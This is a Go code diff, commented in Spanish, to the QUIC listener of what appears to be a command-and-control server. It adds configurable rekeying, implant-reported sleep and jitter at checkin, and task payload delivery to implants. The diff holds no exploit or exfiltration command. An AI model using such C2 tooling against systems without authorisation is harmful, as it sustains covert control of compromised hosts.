@@ -65,6 +65,9 @@ type QUICListener struct {
 
 	profile *profiles.QUICProfile
 
+	// Intervalo de rekey para las sesiones nuevas (0 = default).
+	rekeyEvery uint64
+
 	listener *quic.Listener
 }
 
@@ -77,6 +80,7 @@ func NewQUICListener(
 	serverKeys *crypto.ServerKeyStore,
 	profileRegistry *profiles.QUICRegistry,
 	profileName, certFile, keyFile string,
+	rekeyEvery uint64,
 	log *slog.Logger,
 ) (*QUICListener, error) {
 	if serverKeys == nil {
@@ -107,6 +111,7 @@ func NewQUICListener(
 		log:        log,
 		serverKeys: serverKeys,
 		serverPriv: serverKeys.PrivateKey(),
+		rekeyEvery: rekeyEvery,
 		profile:    profile,
 		router:     protocol.NewRouter(log),
 		crypto:     crypto.NewSessionCryptoStoreWithRepo(store.SessionKeys),
@@ -402,6 +407,8 @@ func (l *QUICListener) handleCheckinEnvelope(ctx context.Context, env *protocol.
 		PID        int    `json:"pid"`
 		Process    string `json:"process"`
 		InternalIP string `json:"internal_ip"`
+		Sleep      int    `json:"sleep"`
+		Jitter     int    `json:"jitter"`
 		PublicKey  string `json:"public_key"`
 	}
 	if err := json.Unmarshal(env.Payload, &req); err != nil {
@@ -410,6 +417,14 @@ func (l *QUICListener) handleCheckinEnvelope(ctx context.Context, env *protocol.
 
 	if req.SessionKey == "" || req.PublicKey == "" {
 		return nil, fmt.Errorf("checkin: session_key y public_key requeridos")
+	}
+	sleep := req.Sleep
+	if sleep <= 0 {
+		sleep = 60
+	}
+	jitter := req.Jitter
+	if jitter < 0 {
+		jitter = 0
 	}
 
 	pubBytes, err := base64.StdEncoding.DecodeString(req.PublicKey)
@@ -444,8 +459,8 @@ func (l *QUICListener) handleCheckinEnvelope(ctx context.Context, env *protocol.
 			ListenerID:    l.ID,
 			PublicKey:     pubBytes,
 			Status:        models.ImplantAlive,
-			SleepInterval: 60,
-			Jitter:        10,
+			SleepInterval: sleep,
+			Jitter:        jitter,
 			FirstSeen:     now,
 			LastCheckIn:   now,
 			Metadata:      map[string]any{},
@@ -478,7 +493,7 @@ func (l *QUICListener) handleCheckinEnvelope(ctx context.Context, env *protocol.
 
 	l.registry.Register(implant.ID)
 
-	sessionCrypto, err := crypto.NewSessionCrypto(l.serverPriv, implantPub, req.SessionKey)
+	sessionCrypto, err := crypto.NewSessionCrypto(l.serverPriv, implantPub, req.SessionKey, l.rekeyEvery)
 	if err != nil {
 		return nil, fmt.Errorf("checkin: derivar session crypto: %w", err)
 	}
@@ -542,6 +557,7 @@ func (l *QUICListener) handleTaskPullEnvelope(ctx context.Context, env *protocol
 			ID:      t.ID.String(),
 			Command: t.Command,
 			Args:    t.Args,
+			Payload: t.Payload,
 		})
 	}
 	tasksJSON, err := json.Marshal(wire)
@@ -587,4 +603,10 @@ func (l *QUICListener) initiateRekey(
 
 	l.log.Info("rekey iniciado", "implant", implantID)
 	return protocol.NewEnvelope(protocol.MsgKeyRotation, encrypted), nil
+}
+
+// ExpirePendingRekeys purga los rekeys pendientes expirados del store
+// criptográfico del listener. Lo llama el janitor del server.
+func (l *QUICListener) ExpirePendingRekeys() []uuid.UUID {
+	return l.crypto.ExpirePendingRekeys()
 }
